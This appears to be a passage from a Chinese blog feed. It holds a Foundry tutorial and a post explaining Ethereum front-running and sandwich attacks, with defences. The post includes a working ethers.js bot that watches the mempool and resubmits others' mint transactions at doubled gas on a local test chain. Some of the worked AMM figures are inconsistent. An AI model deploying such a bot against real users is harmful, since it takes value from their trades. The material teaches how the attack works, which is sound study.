input --rpc-url=$RPC</span><br><span class="line"></span><br><span class="line"># 可以通过该方法decode交易的数据，类似etherscan中的decode方法</span><br><span class="line">cast pretty-calldata &lt;CALLDATA&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163522646.png" alt="image-20230202163522646"></p><p><img src="/image/Foundry.assets/image-20230202163541195.png" alt="image-20230202163541195"></p><h5 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Usage: cast run --rpc-url &lt;URL&gt; &lt;TXHASH&gt;</span><br><span class="line">cast run --rpc-url=http://127.0.0.1:7545 0xc0dd067932ced612c7833ba739c66ad573e76c4909c29be1b3bf7a3d9e0308a0</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164048881.png" alt="image-20230202164048881"></p><h5 id="新建账户"><a href="#新建账户" class="headerlink" title="新建账户"></a>新建账户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast wallet new</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164208435.png" alt="image-20230202164208435"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 新建一个keystore的账号，带有密码</span><br><span class="line">cast wallet new ./</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164304809.png" alt="image-20230202164304809"></p><h5 id="账户签名"><a href="#账户签名" class="headerlink" title="账户签名"></a>账户签名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 两种方法都可以使用签名，第一种载入刚才生成的keystore私钥，第二种直接输入自己的私钥。</span><br><span class="line">cast wallet sign &lt;MESSAGE&gt; --keystore=&lt;PATH&gt; </span><br><span class="line">cast wallet sign &lt;MESSAGE&gt; -i</span><br></pre></td></tr></table></figure><h5 id="账户验证"><a href="#账户验证" class="headerlink" title="账户验证"></a>账户验证</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast wallet verify --address &lt;ADDRESS&gt; &lt;MESSAGE&gt; &lt;SIGNATURE&gt; </span><br></pre></td></tr></table></figure><h5 id="获取合约"><a href="#获取合约" class="headerlink" title="获取合约"></a>获取合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast etherscan-source &lt;contract address&gt;</span><br><span class="line"></span><br><span class="line">cast etherscan-source 0x0FA09c096C419C36c5F1E63542526350DAfeb931 --etherscan-api-key=&#x27;key&#x27;</span><br><span class="line">//下载合约</span><br><span class="line">cast etherscan-source 0x0FA09c096C419C36c5F1E63542526350DAfeb931 -d ./</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cast call [OPTIONS] [TO] [SIG] [ARGS]... [COMMAND] --rpc-url=$RPC</span><br></pre></td></tr></table></figure><p>调用 Counter 合约中的 <code>increment</code> 函数</p><p><code>cast call  0x0FA09c096C419C36c5F1E63542526350DAfeb931 &quot;increment()&quot;</code></p><h5 id="解码ABi"><a href="#解码ABi" class="headerlink" title="解码ABi"></a>解码ABi</h5><p>可以根据ABI反向解析出solidity代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cast interface [OPTIONS] &lt;PATH_OR_ADDRESS&gt;</span><br><span class="line">cast interface ./abi</span><br></pre></td></tr></table></figure><h5 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast --to-hex </span><br><span class="line"></span><br><span class="line">cast --to-dec </span><br><span class="line"></span><br><span class="line">cast --to-unit </span><br><span class="line"></span><br><span class="line">cast --to-wei </span><br><span class="line"></span><br><span class="line">cast --to-rlp </span><br><span class="line"></span><br><span class="line">cast --from-rlp</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Anvil本地节点的使用"><a href="#Anvil本地节点的使用" class="headerlink" title="Anvil本地节点的使用"></a>Anvil本地节点的使用</h3><p>anvil 跟 hardhat 还有 truffle中的ganache都是一样的，是一个本地的eth节点，同样拥有各种fork的功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anvil </span><br><span class="line">anvil --accounts=&lt;NUM&gt; --balance=&lt;NUM&gt; </span><br><span class="line">anvil --mnemonic=&lt;MNEMONIC&gt; </span><br><span class="line">anvil --fork-url=$RPC --fork-block-number=&lt;BLOCK&gt;</span><br></pre></td></tr></table></figure><ul><li><p>热更新</p><p><code>forge build -w </code></p></li><li><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 三个v会现实详细的log信息</span><br><span class="line">forge test -vvv</span><br><span class="line"># 热更新模式</span><br><span class="line">forge test -vvv -w</span><br><span class="line"></span><br><span class="line"># log打印 需要 - vv 2个v以上才可以</span><br></pre></td></tr></table></figure></li></ul><h5 id="console2-log-打印"><a href="#console2-log-打印" class="headerlink" title="console2.log()打印"></a>console2.log()打印</h5><p><img src="/image/Foundry.assets/image-20230202171948681.png" alt="image-20230202171948681"></p><h5 id="emit-log-打印"><a href="#emit-log-打印" class="headerlink" title="emit log 打印"></a>emit log 打印</h5><p><img src="/image/Foundry.assets/image-20230202172327860.png" alt="image-20230202172327860"></p><h5 id="改变状态"><a href="#改变状态" class="headerlink" title="改变状态"></a>改变状态</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function testCheatCode()public</span><br><span class="line">console2.Log(&quot;before:&quot;block.timestamp);</span><br><span class="line">vm.warp(1000);</span><br><span class="line">console2.log(&quot;after:&quot;block.timestamp);</span><br></pre></td></tr></table></figure><h5 id="改变msg-sender-【可以模拟管理员账户】"><a href="#改变msg-sender-【可以模拟管理员账户】" class="headerlink" title="改变msg.sender 【可以模拟管理员账户】"></a>改变msg.sender 【可以模拟管理员账户】</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 只有第一次有影响</span><br><span class="line">vm.prank(address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 多次影响</span><br><span class="line">vm.startPrank(address)</span><br><span class="line">...code</span><br><span class="line">vm.stopPrank()</span><br></pre></td></tr></table></figure><h5 id="改变存储状态"><a href="#改变存储状态" class="headerlink" title="改变存储状态"></a>改变存储状态</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function testCheatCode()public&#123;</span><br><span class="line">console2.Log(&quot;before:&quot;alice.balance);</span><br><span class="line">vm.deal(alice,1 ether);</span><br><span class="line">console2.Log(&quot;after:&quot;alice.balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试一"><a href="#测试一" class="headerlink" title="测试一"></a>测试一</h4><p>安装插件： `</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm i @openzeppelin/contracts </span><br><span class="line"></span><br><span class="line">安装完成之后需要配置foundry.toml方法，在libs中添加 node_modules文件夹。</span><br><span class="line">[profile.default]</span><br><span class="line">src = &#x27;src&#x27;</span><br><span class="line">out = &#x27;out&#x27;</span><br><span class="line">libs = [&#x27;lib&#x27;,&#x27;node_modules&#x27;]</span><br></pre></td></tr></table></figure><p>编写测试用例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line">// 导入IERC20的接口，通过该接口可以调用对应的方法</span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract IERC20Test is Test &#123;</span><br><span class="line">  // 声明Counter合约对象变量</span><br><span class="line">  Counter public counter;</span><br><span class="line">  // 声明一个地址变量</span><br><span class="line">  address public alice;</span><br><span class="line">  // 声明一个msgSender</span><br><span class="line">  address public msgSender;</span><br><span class="line">  // 声明帮助合约函数</span><br><span class="line">  Helper public h;</span><br><span class="line"></span><br><span class="line">  //定义一个IERC20 合约对象</span><br><span class="line">  IERC20 public dai;</span><br><span class="line"></span><br><span class="line">  function setUp() public &#123;</span><br><span class="line">    // new测试合约对象</span><br><span class="line">    counter = new Counter();</span><br><span class="line">    // 调用对象方法</span><br><span class="line">    counter.setNumber(0);</span><br><span class="line">    // new helper对象</span><br><span class="line">    h = new Helper();</span><br><span class="line"></span><br><span class="line">    alice = address(10086);</span><br><span class="line">    console2.log(alice);</span><br><span class="line">    dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 测试给合约地址转账</span><br><span class="line">  function testCheatCode() public &#123;</span><br><span class="line">    console2.log(&quot;before:&quot;, dai.balanceOf(alice));</span><br><span class="line">    deal(address(dai), alice,1 ether);</span><br><span class="line">    console2.log(&quot;after:&quot;, dai.balanceOf(alice));</span><br><span class="line">  &#125;</span><br><span class="line">  // 测试改变合约msg.sender</span><br><span class="line">  function testCheatAddress() public &#123;</span><br><span class="line">    console2.log(&quot;before:&quot;, h.whoCalled());</span><br><span class="line">    vm.prank(address(1));</span><br><span class="line">    console2.log(&quot;after:&quot;, h.whoCalled());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Helper &#123;</span><br><span class="line">  function whoCalled() public view returns (address) &#123;</span><br><span class="line">    return msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202181052114.png" alt="image-20230202181052114"></p><h3 id="vm-sol"><a href="#vm-sol" class="headerlink" title="vm.sol"></a>vm.sol</h3><p><code>vm.sol</code> 中还有很多封装好的方法可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Sets the *next* call&#x27;s msg.sender to be the input address</span><br><span class="line">    function prank(address) external;</span><br><span class="line">    // Sets all subsequent calls&#x27; msg.sender to be the input address until `stopPrank` is called</span><br><span class="line">    function startPrank(address) external;</span><br><span class="line">    // Sets the *next* call&#x27;s msg.sender to be the input address, and the tx.origin to be the second input</span><br><span class="line">    function prank(address,address) external;</span><br><span class="line">    // Sets all subsequent calls&#x27; msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input</span><br><span class="line">    function startPrank(address,address) external;</span><br><span class="line">    // Resets subsequent calls&#x27; msg.sender to be `address(this)`</span><br><span class="line">    function stopPrank() external;</span><br><span class="line">    // Sets an address&#x27; balance, (who, newBalance)</span><br><span class="line">    function deal(address, uint256) external;</span><br><span class="line">    // Sets an address&#x27; code, (who, newCode)</span><br><span class="line">    function etch(address, bytes calldata) external;</span><br><span class="line">    // Expects an error on next call</span><br><span class="line">    function expectRevert(bytes calldata) external;</span><br><span class="line">    function expectRevert(bytes4) external;</span><br><span class="line">    function expectRevert() external;</span><br><span class="line">    // Records all storage reads and writes</span><br><span class="line">    function record() external;</span><br><span class="line">    // Gets all accessed reads and write slot from a recording session, for a given address</span><br><span class="line">    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);</span><br></pre></td></tr></table></figure><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script [OPTIONS] &lt;PATH&gt; [ARGS]...</span><br><span class="line">forge script script/Counter.s.sol:CounterScript</span><br></pre></td></tr></table></figure><p>指定方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script script/Counter.s.sol --sig=&quot;someFunction(uint256 x)&quot; 10</span><br></pre></td></tr></table></figure><h3 id="合约部署脚本"><a href="#合约部署脚本" class="headerlink" title="合约部署脚本"></a>合约部署脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">// 引入合约</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterScript is Script &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        console2.log(&quot;setup &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">//生成合约对象</span><br><span class="line">        Counter c = new Counter();</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>forge script script/deploy.sol  -vvvv</code></p><p><img src="/image/Foundry.assets/image-20230202191223610.png" alt="image-20230202191223610"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Foundry-介绍&quot;&gt;&lt;a href=&quot;#Foundry-介绍&quot; class=&quot;headerlink&quot; title=&quot;Foundry 介绍&quot;&gt;&lt;/a&gt;Foundry 介绍&lt;/h3&gt;&lt;p&gt;Foundry是 一个用 Rust编写的用于以太坊应用程序开发的极快、可移植</summary>
      
    
    
    
    <category term="智能合约 区块链" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>抢先交易 Front-running</title>
    <link href="https://banana69.site/2023/01/17/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93/"/>
    <id>https://banana69.site/2023/01/17/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93/</id>
    <published>2023-01-17T14:12:01.000Z</published>
    <updated>2023-01-18T06:02:53.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="传统抢跑"><a href="#传统抢跑" class="headerlink" title="传统抢跑"></a>传统抢跑</h3><p>抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。</p><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p><p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑机器人通过设置更高 Gas 费用抢先完成攻击交易，以此攫取用户利益的攻击行为。而 Mempool 是一组已经广播到网络中并等待被打包进区块的以太坊交易，它是 Front-Running 可以实施的前提，抢跑机器人通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标。</p><blockquote><p>MEV: 最大可提取价值</p></blockquote><h3 id="链上抢跑实践"><a href="#链上抢跑实践" class="headerlink" title="链上抢跑实践"></a>链上抢跑实践</h3><ul><li>使用 Foundry 的 anvil 搭建本地测试链</li><li>使用 etherJs 脚本监听 mempool 并进行抢跑</li><li>使用 remix 部署合约</li></ul><ol><li><p>启动 Foundry 本地测试链</p><p><code>anvil --chain-id 1234 -b 10</code></p><p>Chain id 为 1234 并且在每 10 秒产出一个区块。</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117222113559.png" alt="image-20230117222113559"></p><p>测试合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@oppenzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FreeMint is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721(&quot;FREE MINT NFT&quot;,&quot;FREEMINT&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    //铸造函数</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        _mint(msg.sender, totalSupply);</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 remix 中部署合约</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117225843870.png" alt="image-20230117225843870"></p></li><li><p>部署 etherJs 抢跑脚本，在该脚本中监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers, utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.WebSocketProvider(<span class="string">&quot;http://127.0.0.1:8545&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> network = provider.getNetwork()</span><br><span class="line">network.then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 连接到 chain ID <span class="subst">$&#123;res.chainId&#125;</span>`</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 interface 对象，用于解码交易详情</span></span><br><span class="line"><span class="keyword">const</span> iface = <span class="keyword">new</span> utils.Interface([</span><br><span class="line">    <span class="string">&quot;function mint() external&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建钱包，用于发送抢跑交易</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&quot;0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6&quot;</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.Wallet(privateKey, provider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> main = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">//监听pending的mint交易，获取交易详情并解码</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;\n. 监听pending交易，获取txHash，并输出交易详情。&quot;</span>)</span><br><span class="line">    provider.on(<span class="string">&quot;pending&quot;</span>, <span class="keyword">async</span> (txHash) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> tx = <span class="keyword">await</span> provider.getTransaction(txHash)</span><br><span class="line">        <span class="keyword">if</span> (txHash) &#123;</span><br><span class="line">            <span class="comment">//监听交易池中未打包的交易，过滤 pending.data</span></span><br><span class="line">            <span class="keyword">if</span> (tx.data.indexOf(iface.getSighash(<span class="string">&quot;mint&quot;</span>)) != -<span class="number">1</span> &amp;&amp; tx.from != wallet.address) &#123;</span><br><span class="line">                <span class="comment">//打印txHash</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`\n[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 监听 Pending 交易: <span class="subst">$&#123;txHash&#125;</span> \r`</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">//打印解码的交易详情</span></span><br><span class="line">                <span class="keyword">let</span> parsedTx = iface.parseTransaction(tx)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;pending交易详情解码：&quot;</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`name: <span class="subst">$&#123;parsedTx.name&#125;</span>`</span>)</span><br><span class="line">                <span class="comment">// Input data解码</span></span><br><span class="line">                <span class="comment">// console.log(&quot;raw transaction&quot;)</span></span><br><span class="line">                <span class="comment">// console.log(tx)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//构建抢跑 tx</span></span><br><span class="line">                <span class="keyword">const</span> txFrontrun = &#123;</span><br><span class="line">                    <span class="attr">to</span>: tx.to,</span><br><span class="line">                    <span class="attr">value</span>: tx.value,</span><br><span class="line">                    <span class="attr">maxPriorityFeePerGas</span>: tx.maxPriorityFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">maxFeePerGas</span>: tx.maxFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">gasLimit</span>: tx.gasLimit * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">data</span>: tx.data</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//发送抢跑交易</span></span><br><span class="line">                <span class="keyword">var</span> txResponse = <span class="keyword">await</span> wallet.sendTransaction(txFrontrun)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`正在 frontrun 交易`</span>)</span><br><span class="line">                <span class="keyword">await</span> txResponse.wait()</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`frontrun 交易成功`</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`交易哈希为：<span class="subst">$&#123;txResponse.hash&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li><li><p>调用 mint 函数，进行 NFT 铸造</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117233952535.png" alt="image-20230117233952535"></p></li><li><p>脚本监听到交易并进行抢跑，在终端可以看到交易详情，在合约中可以调用<code>ownerOf()</code>函数查看 <code>tokenId</code> 为 1 的持有者是抢跑脚本中的钱包地址，则抢跑成功。</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001807115.png" alt="image-20230118001807115"></p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001814266.png" alt="image-20230118001814266"></p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001904634.png" alt="image-20230118001904634"></p></li></ol><h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118002916893.png" alt="image-20230118002916893"></p><p>如上图，两笔攻击交易中间夹着一笔正常的交易，攻击流程为</p><ol><li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li><li>抢跑机器人检测到这笔有利可图的交易后，随即展开攻击，发起一笔买入交易，设定 GasPrice 为 49.9Gwei，凭借 Gas 竞争机制成功抢跑用户的正常交易；</li><li>与此同时，机器人发出另一笔卖出交易，设置 GasPrice 同样为 40.5Gwei，因为时间顺序的原因，紧贴着用户正常交易完成</li></ol><p>根据AMM机制，通过这次抢跑攻击，黑客赚取 16448.012-16310.3-15.2-10.61 = $111.9，这种两笔攻击交易夹着一笔正常交易的攻击，被形象的称为三明治攻击。</p><h4 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h4><p>现如今的主流 DEX 如 Uniswap 等，采用的都是 AMM （自动化做市商）机制，其价格遵循恒定乘积公式。例如，在 Uniswap 中建立一个 A 代币与 ETH 的流动池，A 数量为 1000，ETH 数量为 100，则两者数量乘积为 100000，当前 A 价格为 0.1ETH。当 Alice 试图用 10 个 ETH 来池子里购买 A 时，他所得到的 A 的数量 X，可以用下面的公式推导 (注：为简化计算，以下均未考虑手续费)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1000-X) * (100+10) = 100000</span><br><span class="line">X = 90.9</span><br></pre></td></tr></table></figure><p>这笔交易中，A 的价格为 10/90.9 = 0.11，相比于原来 A 的价格，价格滑点为 :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0.11-0.1) / 0.1 = 0.1 = %10</span><br></pre></td></tr></table></figure><p>一笔交易就让币价产生了 10% 的滑点，可见越是流动性差的池子，遇到大额交易，越是容易产生滑点。如果能在用户正常的大额交易前（预计该交易会产生较大滑点），抢先买入 A，再在用户正常交易后，将刚买入的 A 卖出，就可以获得一笔不菲的收益。</p><p>例如，假设在 Alice 的交易前，Bob 抢先花 5 个 ETH 购买 A，然后在 Alice 的交易完成后，Bob 再把之前买入的 A 卖出</p><ol><li><p>首先是 Bob 的抢跑交易，Bob 用 5 ETH 购得 47.62 个 A：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1000 - X) * (100 + 5) = 10000</span><br><span class="line">X = 47.62</span><br><span class="line">A 的价格：0.10499</span><br></pre></td></tr></table></figure></li><li><p>接下来是 Alice 的正常交易，注意此时流动池中 A 的数量变为 952.38，ETH 的数量变为 105</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(952.38 - X) * (105 + 10) = 10000</span><br><span class="line">X = 82.81</span><br><span class="line">A 的价格：0.12075</span><br></pre></td></tr></table></figure></li><li><p>最后 Bob 卖出 47.62 个 A 的交易，此时流动性中 A 的数量为 869.57，ETH 的数量为 1150</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(869.57 + 47.62) * (115 - Y) = 10000</span><br><span class="line">Y = 5.97</span><br><span class="line">A 的价格：0.12536</span><br></pre></td></tr></table></figure></li></ol><p>通过这一次抢跑攻击，Bob 净赚 5.97-5 = 0.97 个 ETH，而 Alice 净亏 90.9-82.81 = 8.09 个 A，Bob 通过使 Alice 蒙受更大的滑点损失来获得自己的收益。</p><p>实际的抢跑攻击会更复杂，攻击者需要进行更精密的计算，以求实现以下两个目标：</p><ul><li><p>让用户的交易结果无限逼近用户自己设置的最大滑点（max_slippage），以求达到理论上的最大套利空间</p></li><li><p>在手续费竞争力和收益之间取得平衡，尽可能的在与其他机器人的竞争中获胜</p></li></ul><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118005055941.png" alt="image-20230118005055941"></p><p>我们用图表来更好的解释这一过程：</p><ol><li>用户在 A 点，打算投入 in_amount(user) 个 USDT 购买 ETH，这笔交易正常会把当前状态推向 B，同时用户设置了最大滑点为 B(max_slippage)；</li><li>抢跑机器人监测到这笔交易，先于用户交易之前，进行了一笔 in_amount(robot) 个 USDT 的买入交易，将当前状态推到 A’；</li><li>用户的交易随后执行，达到其设置的最大滑点 B(max_slippage)；</li><li>抢跑机器人把步骤 2 中买入的 ETH 卖出，状态达到 C 点，得到 out_amount(robot) 个 USDT</li><li>抢跑机器人获得收益 out_amount(robot) - in_amount(robot)-手续费</li></ol><h3 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h3><p>以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p><ul><li>使用预提交方案(commit-reveal scheme)。</li><li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li><li>设置较低的交易滑点，比如 0.1%，这会让抢跑机器人缺少可盈利的空间，但是过低的滑点值会导致大额交易容易失败。</li><li>提高 gas 费用，增加攻击机器人的成本，但同样会增加自己的交易成本</li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">[1] WTF Solidity 合约安全: S11. 抢先交易</a></p><p><a href="https://learnblockchain.cn/article/2473">[2] 解析以太坊抢先交易原理及其解决方案</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;传统抢跑&quot;&gt;&lt;a href=&quot;#传统抢跑&quot; class=&quot;headerlink&quot; title=&quot;传统抢跑&quot;&gt;&lt;/a&gt;传统抢跑&lt;/h3&gt;&lt;p&gt;抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信</summary>
      
    
    
    
    <category term="智能合约 区块链" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>solidity应用学习笔记</title>
    <link href="https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/"/>
    <id>https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/</id>
    <published>2022-11-10T11:31:09.000Z</published>
    <updated>2023-01-12T15:35:33.903Z</updated>
    
